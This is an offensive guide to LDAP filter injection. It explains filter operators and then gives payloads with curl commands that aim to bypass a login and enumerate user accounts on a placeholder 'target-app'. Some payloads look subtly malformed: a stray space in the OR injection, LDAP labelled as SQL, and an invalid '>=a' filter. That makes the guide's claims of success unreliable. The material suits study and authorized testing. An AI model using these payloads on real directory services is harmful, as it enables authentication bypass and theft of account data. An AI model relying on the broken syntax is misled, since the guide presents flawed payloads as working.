# Filter Syntax Exploitation

## Context

In this guide, we focus on enabling offensive operators to leverage LDAP filter syntax for injection purposes. This can lead to authentication bypass and unauthorized data extraction when properly executed. This article assumes that you have a foundational understanding of the LDAP protocol, its standard filter syntax, and general LDAP injection concepts.

## Theory

### LDAP Filter Operators and Their Roles

LDAP filter operators are crucial in defining the logical and comparison operations within LDAP queries. These filters allow for precise query formulation by offering a range of operations. These include the AND operator (`&`), the OR operator (`|`), the NOT operator (`!`), as well as equality (`=`), presence (`*`), substring matching, approximate matching (`~=`), greater-or-equal (`>=`), and less-or-equal (`<=`) comparisons. These filters help in constructing complex queries to navigate directory services effectively.

### Exploitation Mechanisms in Filter Syntax

The primary vulnerability model in filter syntax exploitation stems from improper input sanitization, which can lead to injection of attacker-controlled filters, thereby altering the intended query logic. Exploitation occurs when an attacker crafts specific inputs that inject operators or wildcards. This manipulation changes how the filters are evaluated, potentially leading to unintended behavior such as unauthorized data access or authentication bypass.

### Manipulating Filter Logic for Offensive Gain

By strategically injecting LDAP filter syntax, attackers can manipulate logic for offensive purposes. For example, injecting an OR operator (`|`) can bypass authentication by always evaluating the condition to true, regardless of the input. Additionally, wildcards (`*`) can be used to perform broad searches or confirm the presence of attributes without specific matches. Combining multiple operators allows attackers to refine their strategy for both simple bypasses and for targeted data retrieval, escalating the impact of the attack.

## Practice

### Authentication Bypass via OR Operator Injection

- **Payload:** 
  ```sql
  *) (|(uid=*))
  ```
  *This payload injects an OR condition that always evaluates to true, effectively bypassing any authentication barriers in place.*

- **Command Execution:**
  ```bash
  curl -d 'username=*) (|(uid=*))&password=irrelevant' http://target-app/login
  ```
  *The command sends the crafted payload to the vulnerable login endpoint, exploiting the OR operator to bypass authentication.*

- **Outcome:** An attacker can gain unauthorized access to the application without valid credentials.

### Data Extraction via Wildcard and Substring Filters

- **Payload:** 
  ```sql
  uid=*
  ```
  *Here, the wildcard is used to match all user IDs, serving as a brute-force method to extract user data.*

- **Command Execution:**
  ```bash
  curl -d 'username=*&password=irrelevant' http://target-app/search
  ```
  *This command submits the payload to a search endpoint, facilitating the enumeration of all user identities.*

- **Outcome:** The attacker successfully retrieves a list of user accounts from the directory.

### Targeted Attribute Extraction with Greater-or-Equal Filter

- **Payload:** 
  ```sql
  uid>=a
  ```
  *This uses the greater-or-equal filter operator to filter user IDs that are lexically equal to or greater than 'a'.*

- **Command Execution:**
  ```bash
  curl -d 'username=>=a&password=irrelevant' http://target-app/search
  ```
  *The attempt here is to extract user information for accounts starting with the letter 'a' and onwards.*

- **Outcome:** Enables attackers to perform precise data extraction based on specific criteria, narrowing down the results to targeted user ranges.

## Tools

- **curl**
- **Burp Suite**
- **ldapsearch**

These tools are essential for crafting payloads, sending commands, and analyzing responses when performing filter syntax exploitation during security assessments. They facilitate the manipulation of LDAP queries to observe different outcomes, making them invaluable for offensive cybersecurity operations.
